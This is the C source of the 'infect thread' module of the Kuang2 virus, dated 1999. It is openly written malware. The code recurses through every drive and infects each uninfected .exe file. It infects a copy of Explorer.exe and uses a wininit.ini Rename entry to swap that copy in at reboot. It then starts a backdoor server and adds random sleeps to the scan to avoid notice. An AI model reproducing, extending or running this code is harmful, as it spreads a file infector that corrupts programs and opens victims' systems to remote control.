/***[ThuNderSoft]*************************************************************
							 KUANG2: infect thread
								   ver: 0.14
								úùÄÍ WEIRD ÍÄùú
*****************************************************************************/

/* HISTORY */
// ver 0.14 (26-may-1999): test mode
// ver 0.13 (21-may-1999): kada ne mo‚e explorer.exe onda ceo c:\windows!
// ver 0.12 (14-may-1999): born code 2
// ver 0.10 (11-may-1999): born code

#include <windows.h>
#include <strmem.h>
#include <tools.h>
#include <win95e.h>

// if TESTMODE is defined then a file will be created in root of C
// that will monitor informations about every infected file - for
// debugging reasons only.
//#define TESTMODE

// if SKIP_C_DISK is defined, virus will not infect C drive
//#define SKIP_C_DISK





#ifdef TESTMODE
DWORD written;
HANDLE testfile;
#endif


// maximal recursion deep
#define		MAX_DEEP		12

extern int IsFileInfect(char *, char*);
extern int InfectFile(char *);

extern HWND hWnd;
extern char Kuang2_class[];
extern DWORD drives;
char *fn;
char _bf[]="..";
char exty[]="w";

unsigned int filescount, deep;
BOOL	INFECT_ALL;

// file signature
extern char kript;
char *signature=&kript+1;



/*
	InfectFolder
	------------
  > Infect folder with all subfolders
  > use recursion with deep-limit
  > infection speed: approx. 21 sec for 10 files */

void InfectFolder(char *folder) {
	WIN32_FIND_DATA FileData;
	HANDLE hSearch;
	char path[MAX_PATH];
	unsigned int ix;

	// recursion deep
	deep++;
	if (deep>MAX_DEEP) {deep--; return;}

	// start folder examing
	strcopyF(path, folder);
	setfilename(path, "*.*");
	hSearch=FindFirstFile(path, &FileData);
	if (hSearch==INVALID_HANDLE_VALUE) return;

	// for all files in folder
	do {
		setfilename(path, FileData.cFileName);		// take the name of current file

		if (FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			if (INFECT_ALL==FALSE) continue;	// does all folders should be infected (or just Window folder)
			fn=getfilename(path);
			if (!lstrcmp(fn, &_bf[1]) || !lstrcmp(fn, _bf)) continue;	// if '.' or '..'
			ix=strlengthF(path);
			path[ix]='\\'; path[ix+1]=0;        // add '/'
#ifdef TESTMODE
			WriteFile(testfile, path, strlengthF(path), &written, NULL);
			WriteFile(testfile, "\r\n", 2, &written, NULL);
#endif
			InfectFolder(path);					// recursion!
#ifdef TESTMODE
			WriteFile(testfile, "<OK>\r\n", 6, &written, NULL);
#endif
			path[ix]=0;							// delete '/'
		} else {
			fn=getfileext(path);					// get extension
			if (fn==NULL) continue;					// if there is no extension go out
			if (!lstrcmpi(fn, "exe")) {             // is it .exe?
				filescount++;
				if (!IsFileInfect(path, signature)) {	// if file is not infected...
					/* INFECT! */
#ifdef TESTMODE
					WriteFile(testfile, path, strlengthF(path), &written, NULL);
#endif
					InfectFile(path);
#ifdef TESTMODE
					WriteFile(testfile, " [OK]\r\n", 7, &written, NULL);
#endif
				}
				// if 10 files has been checked/infected than take a short 
				// break, so hard disk do not work all the time
				if (filescount==10) {
					filescount=0;
#ifndef TESTMODE
					if (INFECT_ALL==TRUE) {				// if all folders shoulg be infected
						ix=GetTickCount() & 0x0F;		// random between 0-15
						Sleep((ix+13)*1000);			// sleep 13sec-28sec
					}
#endif
				}
			}
		}
	} while (FindNextFile(hSearch, &FileData));

	// close search
	FindClose(hSearch);
	deep--;
	return;
}


extern int StartServer(void);


/*
	InfectThread
	------------
  > This thread infect all system */

DWORD WINAPI InfectThread (LPVOID _d)
{
#ifndef TESTMODE
	char explorer[MAX_PATH];
	char ttemp[MAX_PATH];
	char wininit[MAX_PATH];
#endif
	DWORD drvs=drives;
	char root[]="a:\\";

	*signature=0x4C;		// change signature to be ok
	INFECT_ALL=TRUE;		// infect all folders
	Sleep(3000);			// but first sleep for 3 sec

#ifndef TESTMODE

	/* PHASE #1 - infect Explorer.exe */

	GetWindowsDirectory(explorer, MAX_PATH);
	strcopyF(wininit, explorer);
	straddF(explorer, "\\Explorer.exe");        // make a string with Explorer.exe
	straddF(wininit, "\\wininit.ini");          // make a string with Winit.exe
	switch (IsFileInfect(explorer, signature))	// is explorer.exe already infected?
	{
		case 0:			// NOT INFECTED
			strcopyF(ttemp, explorer);
			exty[0]=Kuang2_class[4];				// unique extension
			setfileext(ttemp, exty);				// make string for explorer.exe copy
			CopyFile(explorer, ttemp, FALSE);		// copy explorer.exe
			if (!InfectFile(ttemp)) {				// is it infected ok?
				WritePrivateProfileString("Rename", explorer, ttemp, wininit);   // create 'wininit.ini' :)
			} else {								// if not...
				DeleteFile(ttemp);					// delete copied file
				deep=strlengthF(explorer)-12;
				explorer[deep]=0;					// find Windows folder
				INFECT_ALL=FALSE;					// and infect
				InfectFolder(explorer);				// only that folder
			}
			break;		// coninue
		case -1:		// ERROR (IsFileInfect)
			SendMessage(hWnd, WM_DESTROY, 0, 0);	// terminate all
			return 0;	// exit
	}

#else
	MsgBox("Kuang2 theVirus *TEST* mode.");
	testfile=CreateFile("c:\\k2test.dat", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
#endif


	/* PHASE #2 - infect all system */

	// first start server, 
	StartServer();

	// sleep for 10 sec
	Sleep(10000);

	// infect all system
	filescount=0;			// file counter
	while (drvs) {
		deep=0;
#ifdef SKIP_C_DISK
		if (root[0]=='c') {
			root[0]++;
			drvs=drvs>>1;
			continue;
		}
#endif
		if (drvs & 1) InfectFolder(root);
		drvs=drvs>>1;
		root[0]++;
	}

#ifdef TESTMODE
	MsgBox("THE END");
	CloseHandle(testfile);
	SendMessage(hWnd, WM_DESTROY, 0, 0);
#endif

	return 0;
}